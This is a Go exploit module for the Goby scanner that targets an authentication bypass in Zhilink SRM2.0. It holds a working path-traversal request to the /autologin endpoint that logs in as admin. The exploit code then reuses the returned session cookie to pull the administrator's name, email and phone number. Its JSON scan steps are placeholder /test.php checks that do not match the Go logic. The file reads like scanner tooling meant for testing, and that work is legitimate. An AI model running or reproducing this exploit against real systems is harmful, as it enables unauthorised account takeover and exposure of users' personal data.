package exploits

import (
	"errors"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Zhilink SRM2.0 /autologin Permission Bypass Vulnerability",
    "Description": "<p>Relying on artificial intelligence, Internet of Things, big data, cloud and other technologies, Zhilian Cloud Mining helps enterprises realize online, mobile and intelligent supplier relationship management and procurement through software and hardware systematic solutions, improve procurement and collaboration efficiency, thereby avoiding supply and demand risks, strengthening supply chain integration capabilities, and building a community of corporate interests.  </p><p>The SRM2.0 autologin interface code logic is flawed, resulting in unauthorized attackers constructing a special way to bypass identity authentication and directly take over the background as administrators, resulting in information leakage and the system in an extremely insecure state.</p>",
    "Product": "zhilink SRM2.0",
    "Homepage": "https://www.zhilink.com/SRM.html",
    "DisclosureDate": "2024-09-03",
    "PostTime": "2024-10-15",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title=\"SRM 2.0\" && body=\"assets/js/jquery.min.js\"",
    "GobyQuery": "title=\"SRM 2.0\" && body=\"assets/js/jquery.min.js\"",
    "Level": "1",
    "Impact": "<p>The SRM2.0 autologin interface code logic is flawed, resulting in unauthorized attackers constructing a special way to bypass identity authentication and directly take over the background as administrators, resulting in information leakage and the system in an extremely insecure state.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/weixin_45790890/article/details/141857627"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "default,userMessage",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "智联云采 SRM2.0 /autologin 权限绕过漏洞",
            "Product": "智联云采 SRM2.0",
            "Description": "<p>智联云采是一款针对企业供应链管理难题及智能化转型升级需求而设计的解决方案，针对企业供应链管理难题，及智能化转型升级需求，智联云采依托人工智能、物联网、大数据、云等技术，通过软硬件系统化方案，帮助企业实现供应商关系管理和采购线上化、移动化、智能化，提升采购和协同效率，进而规避供需风险，强化供应链整合能力，构建企业利益共同体。&nbsp;<br></p><p>智联云采 SRM2.0 autologin 接口代码逻辑存在缺陷，导致未授权的攻击者可以构造特殊绕过身份认证直接以管理员身份接管后台，造成信息泄露，使系统处于极不安全的状态。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>智联云采 SRM2.0 autologin 接口代码逻辑存在缺陷，导致未授权的攻击者可以构造特殊绕过身份认证直接以管理员身份接管后台，造成信息泄露，使系统处于极不安全的状态。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Zhilink SRM2.0 /autologin Permission Bypass Vulnerability",
            "Product": "zhilink SRM2.0",
            "Description": "<p>Relying on artificial intelligence, Internet of Things, big data, cloud and other technologies, Zhilian Cloud Mining helps enterprises realize online, mobile and intelligent supplier relationship management and procurement through software and hardware systematic solutions, improve procurement and collaboration efficiency, thereby avoiding supply and demand risks, strengthening supply chain integration capabilities, and building a community of corporate interests.&nbsp;&nbsp;</p><p>The SRM2.0 autologin interface code logic is flawed, resulting in unauthorized attackers constructing a special way to bypass identity authentication and directly take over the background as administrators, resulting in information leakage and the system in an extremely insecure state.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The SRM2.0 autologin interface code logic is flawed, resulting in unauthorized attackers constructing a special way to bypass identity authentication and directly take over the background as administrators, resulting in information leakage and the system in an extremely insecure state.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9961"
}`
	postOrGet_csdjocvhnsdjdfkvsdjfsdjkdgvhergfyehbrvcwyfiaosdhushfdhahjsdf := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		requestConfig := httpclient.NewGetRequestConfig(fileUrl)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 302 {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.HeaderString.String()
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := ""
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/adpweb/static/..;/api/sys/app/autologin?loginName=admin": "Path=/adpweb",
			}
			// 函数继承
			uploadFileFunc := postOrGet_csdjocvhnsdjdfkvsdjfsdjkdgvhergfyehbrvcwyfiaosdhushfdhahjsdf

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			mode := goutils.B2S(ss.Params["mode"])
			expResult.Success = false
			if mode == "userMessage" {
				requestConfig := httpclient.NewGetRequestConfig("/adpweb/static/..;/api/sys/app/autologin?loginName=admin")
				requestConfig.VerifyTls = false
				requestConfig.FollowRedirect = false
				resp, err := httpclient.DoHttpRequest(expResult.HostInfo, requestConfig)
				if err != nil || resp.StatusCode != 302 {
					return expResult
				}
				// 定义正则表达式模式
				pattern := `zhilink\.session\.id=(.*?);`
				// 编译正则表达式
				re := regexp.MustCompile(pattern)
				if !re.MatchString(resp.HeaderString.String()) {
					return expResult
				}
				// 在文本中查找匹配项
				match := re.FindStringSubmatch(resp.HeaderString.String())
        cook :=match[0]
        requestConfig.URI="/adpweb/a/sys/user/info"
        requestConfig.Header.Store("Cookie", cook)
        resp, err = httpclient.DoHttpRequest(expResult.HostInfo, requestConfig)
        if err != nil || resp.StatusCode != 200 {
					return expResult
        }
        pattern = `name" class="required form-control" readonly="readonly" type="text" value="(.*?)"`
        re = regexp.MustCompile(pattern)
        if !re.MatchString(resp.RawBody) {
          return expResult
        }
        match = re.FindStringSubmatch(resp.RawBody)
        expResult.Output = "Use cookie \""+cook+"\" to get userMessage : \r\nname = "+match[1]

        pattern = `email" type="text" value="(.*?)"`
        re = regexp.MustCompile(pattern)
        if !re.MatchString(resp.RawBody) {
          return expResult
        }
        match = re.FindStringSubmatch(resp.RawBody)
        expResult.Output += "\r\nemail = "+match[1]

        pattern = `phone" class="form-control" type="text" value="(.*?)"`
        re = regexp.MustCompile(pattern)
        if !re.MatchString(resp.RawBody) {
          return expResult
        }
        match = re.FindStringSubmatch(resp.RawBody)
        expResult.Output += "\r\nphone = "+match[1]

        expResult.Success = true
        return expResult
			}else if mode == "default" {
           expResult.Success = true
          expResult.Output = "Please visit \""+expResult.HostInfo.FixedHostInfo+"/adpweb/static/..;/api/sys/app/autologin?loginName=admin\" to login"
					return expResult
      }

			return expResult
		},
	))
}
